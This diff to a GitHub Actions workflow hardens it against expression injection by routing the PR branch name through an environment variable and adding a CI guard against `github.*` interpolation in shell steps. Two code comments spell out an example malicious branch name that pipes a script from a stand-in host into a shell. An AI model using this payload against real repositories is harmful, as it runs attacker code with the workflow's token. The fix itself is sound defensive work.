@@ -19,10 +19,21 @@ jobs:
     if: github.event_name == 'pull_request' && github.base_ref == 'main'
     runs-on: ubuntu-latest
     steps:
+      # Issue #574: `github.head_ref` (the PR source branch name) is
+      # attacker-controlled on fork PRs and must never be interpolated
+      # directly into a `run:` shell string — GitHub expands expressions
+      # BEFORE the shell parses the script, so a branch named
+      # `develop"; curl evil.sh | sh; #` would execute in the runner with
+      # this job's GITHUB_TOKEN. Indirect through `env:` (the same shape
+      # as the #301 PR-body guard below) so the shell only ever sees a
+      # quoted variable. scripts/check_workflow_run_injections.py fences
+      # the pattern repo-wide.
       - name: main may only receive PRs from develop
+        env:
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          if [ "${{ github.head_ref }}" != "develop" ]; then
-            echo "::error::Pull requests to 'main' must originate from 'develop' (got '${{ github.head_ref }}')."
+          if [ "${HEAD_REF}" != "develop" ]; then
+            echo "::error::Pull requests to 'main' must originate from 'develop' (got '${HEAD_REF}')."
             exit 1
           fi
 
@@ -85,6 +96,23 @@ jobs:
             echo "::error::Workflows must pin third-party actions to commit SHAs, not mutable major tags (issue #389)."
             exit 1
           fi
+      # Issue #574: fail the build when any workflow interpolates
+      # `${{ github.* }}` directly inside a `run:` block. GitHub expands
+      # expressions before the shell parses the script, so untrusted
+      # values (head_ref / title / event.pull_request.* — attacker-
+      # controlled on fork PRs) become classic expression injection:
+      # `develop"; curl evil.sh | sh; #` as a branch name executes with
+      # the job's GITHUB_TOKEN, defeating the #389 digest-pinning +
+      # SLSA posture from inside the workflow itself. The guard parses
+      # each workflow structurally (yaml.safe_load) and scans ONLY the
+      # string value of `run:` keys — legitimate `${{ github.<safe> }}`
+      # uses inside `env:` / `with:` / `if:` blocks are the indirection
+      # pattern itself and are NOT flagged. tests/test_ci_workflow_hygiene.py
+      # runs the same script locally as part of pytest.
+      - name: "Reject github.* interpolation inside run: blocks (issue #574)"
+        run: |
+          pip install pyyaml  # the guard script uses yaml.safe_load
+          python scripts/check_workflow_run_injections.py
       - run: pip install 'ruff>=0.16' # same floor as pyproject dev deps (#68); otherwise follows latest
       - run: ruff check .
       # Issue #152: drift guard against initial-scaffold TODO(phase N)
